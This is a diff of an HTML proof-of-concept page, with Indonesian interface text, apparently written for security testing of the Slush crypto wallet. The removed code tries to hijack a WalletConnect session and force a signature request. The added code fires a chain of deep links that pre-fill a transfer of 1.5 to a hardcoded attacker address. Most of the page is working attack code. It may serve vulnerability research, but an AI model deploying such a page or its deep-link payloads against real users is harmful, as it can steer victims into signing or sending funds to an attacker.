@@ -3,54 +3,53 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>PoC | Deep Link Hijacking Slush</title>
+    <title>PoC | Deep Link Auto-fill Transfer</title>
     <style>
-        :root { --accent: #ff00ff; --bg: #050505; }
-        body { background: var(--bg); color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
-        .exploit-card { border: 2px dashed var(--accent); padding: 20px; border-radius: 10px; background: #111; }
-        .btn-link { background: var(--accent); color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin: 10px 0; }
-        #log { text-align: left; font-size: 11px; color: #888; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
+        :root { --danger: #ff0055; --bg: #080808; }
+        body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .test-card { border: 2px solid var(--danger); padding: 30px; border-radius: 15px; text-align: center; background: #111; box-shadow: 0 0 20px rgba(255, 0, 85, 0.3); }
+        .btn-exploit { background: var(--danger); color: white; border: none; padding: 15px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; }
+        .status { margin-top: 15px; font-size: 12px; color: #888; font-family: monospace; }
     </style>
 </head>
 <body>
 
-<div class="exploit-card">
-    <h2>DEEP LINK HIJACK</h2>
-    <p style="color:#aaa; font-size: 12px;">Simulasi pengambilalihan sesi WalletConnect melalui skema URI aplikasi.</p>
-
-    <button class="btn-link" onclick="hijackWalletConnect()">HIJACK WALLETCONNECT</button>
-    <button class="btn-link" style="background:#555" onclick="triggerMaliciousSign()">FORCE SIGN REQUEST</button>
-
-    <div id="log">Logs:<br></div>
+<div class="test-card">
+    <h2 style="color:var(--danger)">URGENT: CRITICAL TEST</h2>
+    <p>Uji coba pengisian otomatis transaksi (Auto-fill) melalui Deep Link.</p>
+    
+    <button class="btn-exploit" onclick="testAutofill()">TEST AUTO-FILL TRANSFER</button>
+    
+    <div class="status" id="log">> Awaiting interaction...</div>
 </div>
 
 <script>
-    function addLog(msg) {
-        document.getElementById('log').innerHTML += `> ${msg}<br>`;
-    }
+    function testAutofill() {
+        const log = document.getElementById('log');
+        
+   
+        const attackerAddress = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
+        const amount = "1.5";
+        
+      
+        const deepLinks = [
+            `slush://send?to=${attackerAddress}&amount=${amount}`,
+            `slush://transfer?address=${attackerAddress}&uint256=${amount}`,
+            `ethereum:${attackerAddress}?value=${amount}`
+        ];
 
-    function hijackWalletConnect() {
-        
-        const fakeWC = "wc:00e46b69-d0eb-46a2-934d-ce341961d46d@1?bridge=https%3A%2F%2Ff.bridge.walletconnect.org&key=deadbeef";
-        addLog("Attempting to hijack 'wc:' protocol...");
-        
+        log.innerText = "> Sending malicious URIs...";
 
-        window.location.href = fakeWC;
-        
+        deepLinks.forEach((uri, index) => {
+            setTimeout(() => {
+                log.innerText = `> Triggering: ${uri}`;
+                window.location.href = uri;
+            }, index * 1000);
+        });
+
         setTimeout(() => {
-            addLog("Check if Slush Wallet opened automatically without prompt.");
-        }, 1500);
-    }
-
- 
-    function triggerMaliciousSign() {
-
-        const maliciousURI = "slush://request?method=personal_sign&params=DANGER_MESSAGE";
-        addLog("Triggering unverified sign request...");
-        
-        window.location.href = maliciousURI;
-        
-        alert("Jika aplikasi muncul dengan permintaan tanda tangan otomatis, ini adalah kerentanan High/Critical.");
+            alert("PERIKSA DOMPET ANDA:\nJika halaman transfer terbuka dengan alamat penyerang dan jumlah 1.5 sudah terisi otomatis, ini adalah temuan CRITICAL.");
+        }, 3500);
     }
 </script>
 
